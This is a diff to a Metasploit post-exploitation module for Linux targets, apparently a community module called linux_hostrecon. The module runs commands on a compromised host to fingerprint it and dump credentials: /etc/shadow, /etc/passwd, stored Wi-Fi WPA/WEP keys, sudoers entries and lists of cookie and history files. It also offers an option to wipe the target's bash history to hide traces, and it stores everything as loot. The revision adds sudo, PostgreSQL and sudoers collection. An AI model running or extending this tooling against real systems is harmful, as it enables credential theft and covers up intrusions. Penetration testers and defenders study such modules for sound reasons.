@@ -16,7 +16,7 @@
 #
 # [ POST-EXPLOITATION MODULE DESCRIPTION ]
 # This module gathers target system information (linux distros), dump remote credentials
-# display outputs and stores it into a logfile in msf4/loot folder. this module also allows
+# display outputs and stores it into a logfile in ~/.msf4/loot folder. this module also allows
 # users to execute a single_command in bash + read/store outputs (advanced options).
 #
 #
@@ -26,7 +26,7 @@
 # Agressive system fingerprints scan?      => set AGRESSIVE_DUMP true
 # Dump remote credentials from target?     => set CREDENTIALS_DUMP true
 # The bash command to execute remotly      => set SINGLE_COMMAND for i in $(cat /etc/passwd | cut -d ':' -f1); do id $i; done
-# Delete remote shell history commands?    => set DEL_SHELL_HISTORY true
+# Clean remote bash_history command list?  => set DEL_BASH_HISTORY true
 #
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
@@ -100,7 +100,7 @@ class MetasploitModule < Msf::Post
                                         'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author :D
                                 ],
  
-                        'Version'        => '$Revision: 1.4',
+                        'Version'        => '$Revision: 1.5',
                         'DisclosureDate' => 'set 30 2017',
                         'Platform'       => 'linux',
                         'Arch'           => 'x86_x64',
@@ -127,15 +127,15 @@ class MetasploitModule < Msf::Post
  
                 register_options(
                         [
-                                OptString.new('SESSION', [ true, 'The session number to run this module on'])
+                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
+                                OptBool.new('STORE_LOOT', [false, 'Store dumped data to ~/.msf4/loot folder?', false])
                         ], self.class)
 
                 register_advanced_options(
                         [
-                                OptBool.new('STORE_LOOT', [false, 'Store dumped data to msf4/loot folder?', false]),
                                 OptBool.new('AGRESSIVE_DUMP', [false, 'Agressive system fingerprints scan?', false]),
                                 OptBool.new('CREDENTIALS_DUMP', [false, 'Dump remote credentials from target?', false]),
-                                OptBool.new('DEL_SHELL_HISTORY', [false, 'Delete remote shell history commands?', false]),
+                                OptBool.new('DEL_BASH_HISTORY', [false, 'Clean remote bash_history command list?', false]),
                                 OptString.new('SINGLE_COMMAND', [false, 'The bash command to execute remotely'])
                         ], self.class)
  
@@ -206,23 +206,27 @@ def run
       # bash commands to be executed remotely ..
       #
       date_out = cmd_exec("date")
+      user_name = cmd_exec("whoami")
       py_version = cmd_exec("python -V")
       distro_uname = cmd_exec("uname -a")
+      psq_version = cmd_exec("psql -V | awk {'print $3'}")
       ruby_version = cmd_exec("ruby -v  | awk {'print $1,$2'}")
       firefox_version = cmd_exec("firefox --version | awk {'print $3'}")
-      gateway = cmd_exec("netstat -r | grep \"255.\" | awk {'print $3'}")
+      gateway = cmd_exec("netstat -r | grep '255.' | awk {'print $3'}")
       interface = cmd_exec("netstat -r | grep default | awk {'print $8'}")
       hardware_bits = cmd_exec("lscpu | grep 'CPU op-mode' | awk {'print $3'}")
       hardware_vendor = cmd_exec("lscpu | grep 'Vendor ID' | awk {'print $3'}")
-      mem_dirty = cmd_exec("cat /proc/meminfo | grep \"Dirty\" | awk {'print $2,$3'}")
-      mem_free = cmd_exec("cat /proc/meminfo | grep \"MemFree\" | awk {'print $2,$3'}")
+      sudo_version = cmd_exec("sudo -V | grep 'Sudo version' | awk {'print $3'}")
+      mem_dirty = cmd_exec("cat /proc/meminfo | grep 'Dirty' | awk {'print $2,$3'}")
+      mem_free = cmd_exec("cat /proc/meminfo | grep 'MemFree' | awk {'print $2,$3'}")
+      mem_total = cmd_exec("cat /proc/meminfo | grep 'MemTotal' | awk {'print $2,$3'}")
       sys_lang = cmd_exec("set | egrep '^(LANG|LC_)' | cut -d '=' -f2 | cut -d '.' -f1")
-      mem_total = cmd_exec("cat /proc/meminfo | grep \"MemTotal\" | awk {'print $2,$3'}")
       sh_version = cmd_exec("bash --version | head -1 | awk {'print $2,$4'} | cut -d '-' -f1")
-      mem_available = cmd_exec("cat /proc/meminfo | grep \"MemAvailable\" | awk {'print $2,$3'}")
-      model_name = cmd_exec("lscpu | grep \"Model name:\" | awk {'print $3,$4,$5,$6,$7,$8,$9,$10'}")
-      target_ssid = cmd_exec("iw dev #{interface} scan | grep \"SSID\" | head -1 | awk {'print $2'}")
+      mem_available = cmd_exec("cat /proc/meminfo | grep 'MemAvailable' | awk {'print $2,$3'}")
+      model_name = cmd_exec("lscpu | grep 'Model name:' | awk {'print $3,$4,$5,$6,$7,$8,$9,$10'}")
+      target_ssid = cmd_exec("iw dev #{interface} scan | grep 'SSID' | head -1 | awk {'print $2'}")
       distro_description = cmd_exec("cat /etc/*-release | grep 'DISTRIB_DESCRIPTION=' | cut -d '=' -f2")
+      user_privs = cmd_exec("cat /etc/sudoers | grep \"#{user_name}\" | grep -v \"#\" | awk {'print $2,$3'}")
       localhost_ip = cmd_exec("ping -c 1 localhost | head -n 1 | awk {'print $3'} | cut -d '(' -f2 | cut -d ')' -f1")
         print_status("Storing scan results into msf database ..")
         Rex::sleep(0.7)
@@ -233,7 +237,7 @@ def run
         data_dump << "\n\n"
         data_dump << "linux_hostrecon logfile\n"
         data_dump << "Date/Hour: " + date_out + "\n"
-        data_dump << "---------------------------------------\n"
+        data_dump << "----------------------------------------\n"
         data_dump << "Running on session  : #{datastore['SESSION']}\n"
         data_dump << "Target Computer     : #{sys_info['Computer']}\n"
         data_dump << "Target session PID  : #{session_pid}\n"
@@ -246,9 +250,11 @@ def run
         data_dump << "Target mem available: #{mem_available}\n"
         data_dump << "Target mem dirty    : #{mem_dirty}\n"
         data_dump << "System language     : #{sys_lang}\n"
+        data_dump << "Sudo version        : #{sudo_version}\n"
         data_dump << "Bash version        : #{sh_version}\n"
         data_dump << "Python version      : #{py_version}\n"
         data_dump << "Ruby version        : #{ruby_version}\n"
+        data_dump << "PostgreSQL version  : #{psq_version}\n"
         data_dump << "Firefox version     : #{firefox_version}\n"
         data_dump << "Target interface    : #{interface}\n"
         data_dump << "target_SSID         : #{target_ssid}\n"
@@ -257,6 +263,7 @@ def run
         data_dump << "Target localhost    : #{localhost_ip}\n"
         data_dump << "Payload directory   : #{payload_path}\n"
         data_dump << "Client UID          : #{target_uid}\n"
+        data_dump << "User r/w Privileges : #{user_name}  #{user_privs}\n"
         data_dump << "Distro description  : #{distro_description}\n"
         data_dump << "Operative System    : #{sys_info['OS']}\n"
         data_dump << "Distro uname        : #{distro_uname}\n"
@@ -286,8 +293,9 @@ def run
           distro_shells = cmd_exec("grep '^[^#]' /etc/shells")
           distro_history = cmd_exec("ls -la /root/.*_history")
           distro_logs = cmd_exec("find /var/log -type f -perm -4")
-          net_established = cmd_exec("netstat -atnp | grep \"ESTABLISHED\"")
+          net_established = cmd_exec("netstat -atnp | grep 'ESTABLISHED'")
           default_shell = cmd_exec("ps -p $$ | tail -1 | awk '{ print $4 }'")
+          sudo_ers = cmd_exec("cat /etc/sudoers | grep -v -e \"^$\" | grep -v \"Defaults\" | grep -v \"#\"")
             print_status("Storing scan results into msf database ..")
             Rex::sleep(0.7)
             #
@@ -319,6 +327,10 @@ def run
             data_dump << "AVAILABLE SHELLS :\n"
             data_dump << "------------------\n"
             data_dump << distro_shells
+            data_dump << "\n\n"
+            data_dump << "SUDOERS LIST :\n"
+            data_dump << "--------------\n"
+            data_dump << sudo_ers
             data_dump << "\n\n"
             data_dump << "LIST OF HISTORY FILES :\n"
             data_dump << "-----------------------\n"
@@ -367,15 +379,15 @@ def run
           # bash commands to be executed remotely ..
           #
           # dump cookies
-          list_sqlite = cmd_exec("ls -a -R /root | grep \"sqlite\"")
-          list_cookies = cmd_exec("ls /usr/share/pyshared/mechanize | grep \"cookie\"")
+          list_sqlite = cmd_exec("ls -a -R /root | grep 'sqlite'")
+          list_cookies = cmd_exec("ls /usr/share/pyshared/mechanize | grep 'cookie'")
           # Dump target WIFI credentials stored ..
           wpa_out = cmd_exec("grep psk= /etc/NetworkManager/system-connections/*")
           wep_out = cmd_exec("grep wep-key0= /etc/NetworkManager/system-connections/*")
           # dump etc/passwd & etc/shadow files from target
           etc_pass = cmd_exec("cat /etc/passwd")
           etc_shadow = cmd_exec("cat /etc/shadow")
-          # list all uuid id's
+          # list all uid/guid id's/info
           uuid_id = cmd_exec("for i in $(cat /etc/passwd | cut -d ':' -f1); do id $i; done")
             print_status("Storing scan results into msf database ..")
             Rex::sleep(0.7)
@@ -442,7 +454,6 @@ def run
             data_dump << single_comm
             data_dump << "\n\n"
         end
-        data_dump << "----------------------------------------------"
 
 
 
